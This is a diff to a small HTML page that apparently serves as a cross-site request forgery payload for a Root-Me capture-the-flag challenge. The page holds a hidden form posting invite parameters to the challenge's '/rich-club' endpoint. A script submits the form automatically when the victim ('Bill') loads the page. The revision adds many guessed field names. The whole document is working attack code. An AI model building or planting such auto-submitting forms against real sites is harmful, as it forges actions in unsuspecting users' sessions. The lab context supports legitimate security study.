@@ -1,24 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Important Project</title>
-</head>
+<html>
 <body>
-    <h1>Chargement du projet...</h1>
+    <h1>Tentative d'invitation multiple...</h1>
 
-    <form action="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club" method="POST" id="csrf-trap">
+    <form action="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club" method="POST" id="shotgun-form">
         
         <input type="hidden" name="username" value="a">
-        
+        <input type="hidden" name="pseudo" value="a">
+        <input type="hidden" name="user" value="a">
+
+        <input type="hidden" name="email" value="a">
+        <input type="hidden" name="mail" value="a">
+        <input type="hidden" name="recipient" value="a">
+
         <input type="hidden" name="submit" value="Invite">
+        <input type="hidden" name="invite" value="1">
+        <input type="hidden" name="action" value="invite">
+
     </form>
 
     <script>
-        // Envoi automatique du formulaire dès que Bill arrive sur la page
-        document.getElementById('csrf-trap').submit();
+        // On envoie le tout
+        document.getElementById('shotgun-form').submit();
     </script>
 
 </body>
 </html>
-
